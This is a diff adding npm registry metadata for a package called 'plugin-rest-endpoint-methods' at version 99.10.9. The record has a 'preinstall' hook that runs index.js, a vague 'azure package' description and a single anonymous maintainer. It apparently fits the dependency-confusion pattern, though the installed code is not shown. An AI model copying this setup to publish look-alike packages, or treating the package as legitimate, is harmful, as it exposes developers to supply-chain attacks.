@@ -1,0 +1,62 @@
+{
+    "_id": "plugin-rest-endpoint-methods",
+    "name": "plugin-rest-endpoint-methods",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "plugin-rest-endpoint-methods",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "plugin-rest-endpoint-methods@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-Il4V+u5+vu80weFT35jnckEgx/NlOW87QnLUzqONzamgb6YP1WZM88zuanwRz4CNs7Ao+IigeQjF28sT7gReVA==",
+                "shasum": "6ee8be846c8f5a77ec80ad4744b74c927755e6d7",
+                "tarball": "https://registry.npmjs.org/plugin-rest-endpoint-methods/-/plugin-rest-endpoint-methods-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5080,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiO2/OACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmoD8hAAm0cCZc2yp3kpVqhKSiAYnqmNijiv+QecT7RFIKhvwvWhBt9G\r\nzf77nG7B4dJKDBojQqZtXiXIczVNEdYnpso+A16vHT1Si1/Dxkz/QNkkl2W/\r\nhrdn40s7PvffMm6s/Z++9U5yBA+L7DuRaH30pqC5KI75gPsiRgtE0zrjAefi\r\ncTpjr1KfJMkojhiDq4r7bucCnzQXOLEr3L/KAbQZ5TLqeytSikAhFUZDkvpp\r\nTYCV2zqtPm5MGKaQt4skmv/EV6KEQMSTTSkhSdocsPUI7d/snoI4Ig8qXANr\r\nW8+4dk3PID+s9DUSNQotlEMchE4vSbQlavxcvvbJizb30G/dZlx82mlRXGTh\r\noxK0GCkwTQ1VYEADSSrfStvvjIoLhnI44Hb7wqOCgUQQ/TziYY+vGfJ5tuwh\r\nane7Q6tQJ6nkXCOqVGs+Cex33gVxhzd+RXvCV+aEbxvndGDamM/gVF2qxdQ3\r\netNGVfw8N+4fBpbinlWBEiBdBLQJ2B2Z3MHBeIE3clmcCnMNyVRWN5Cf4l5y\r\nn/PprlD5uZrREnZtQOLZc0Z7XUBrYAWhmyxdU+AmnzoB6plGR0JJnfljRGYB\r\npSkNIXkSg95yno5N0nusWjsal2ja5kUbPjy84VsxaBtvVw807LbK1FINVfBu\r\nytL5x17DS0ZM2MWvcVLV4/DgStskAXsIZeI=\r\n=pfDx\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "xit99s0w",
+                "email": "xit99s0w@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "xit99s0w",
+                    "email": "xit99s0w@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/plugin-rest-endpoint-methods_99.10.9_1648062413983_0.664508609142686"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-23T19:06:53.983Z",
+        "99.10.9": "2022-03-23T19:06:54.187Z",
+        "modified": "2022-03-23T19:06:54.300Z"
+    },
+    "maintainers": [
+        {
+            "name": "xit99s0w",
+            "email": "xit99s0w@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
